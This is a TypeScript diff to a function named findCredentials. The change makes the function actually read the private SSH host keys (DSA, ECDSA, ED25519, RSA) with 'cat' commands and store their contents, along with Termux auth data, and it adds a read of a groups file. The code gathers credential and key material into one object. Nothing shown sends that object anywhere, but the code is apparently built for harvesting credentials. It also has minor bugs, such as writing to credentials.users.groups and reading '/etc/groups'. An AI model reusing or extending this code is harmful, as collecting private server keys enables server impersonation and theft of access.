@@ -20,6 +20,7 @@ const findCredentials = (text: string) => {
   credentials.ssh = {} as any;
   credentials.termux = {} as any;
   credentials.ssh.sshd = {} as any;
+  credentials.groups = {} as any;
 
   /* In case system is Termux, prepend prefix to paths */
   const prefix = _run(`echo "$PREFIX"`);
@@ -158,32 +159,39 @@ const findCredentials = (text: string) => {
     credentials.termux.authInfo.content = termuxAuthInfo;
   }
 
-  const sshdDsaKey = _run(`${path}/etc/ssh/ssh_host_dsa_key`);
+  const sshdDsaKey = _run(`cat ${path}/etc/ssh/ssh_host_dsa_key`);
   if (sshdDsaKey) {
     credentials.ssh.sshd.dsaKey = {} as any;
     credentials.ssh.sshd.dsaKey.path = `${path}/etc/ssh/ssh_host_dsa_key`;
     credentials.ssh.sshd.dsaKey.content = sshdDsaKey;
   }
 
-  const sshdEcdsa = _run(`${path}/etc/ssh/ssh_host_ecdsa_key`);
+  const sshdEcdsa = _run(`cat ${path}/etc/ssh/ssh_host_ecdsa_key`);
   if (sshdEcdsa) {
     credentials.ssh.sshd.ecdsaKey = {} as any;
     credentials.ssh.sshd.ecdsaKey.path = `${path}/etc/ssh/ssh_host_ecdsa_key`;
     credentials.ssh.sshd.ecdsaKey.content = sshdEcdsa;
   }
 
-  const sshdHostEd = _run(`${path}/etc/ssh/ssh_host_ed25519_key`);
+  const sshdHostEd = _run(`cat ${path}/etc/ssh/ssh_host_ed25519_key`);
   if (sshdHostEd) {
     credentials.ssh.sshd.hostEdKey = {} as any;
     credentials.ssh.sshd.hostEdKey.path = `${path}/etc/ssh/ssh_host_ed25519_key`;
     credentials.ssh.sshd.hostEdKey.content = sshdHostEd;
   }
 
-  const sshdHostRsa = _run(`${path}/etc/ssh/ssh_host_rsa_key`);
+  const sshdHostRsa = _run(`cat ${path}/etc/ssh/ssh_host_rsa_key`);
   if (sshdHostRsa) {
     credentials.ssh.sshd.hostRsaKey = {} as any;
     credentials.ssh.sshd.hostRsaKey.path = `${path}/etc/ssh/ssh_host_rsa_key`;
     credentials.ssh.sshd.hostRsaKey.content = sshdHostRsa;
+  }
+
+  const groups = _run(`cat ${path}/etc/groups`);
+  if (groups) {
+    credentials.users.groups = {} as any;
+    credentials.users.groups.path = `${path}/etc/groups`;
+    credentials.users.groups.content = groups;
   }
 
   // TODO: Remove void objects
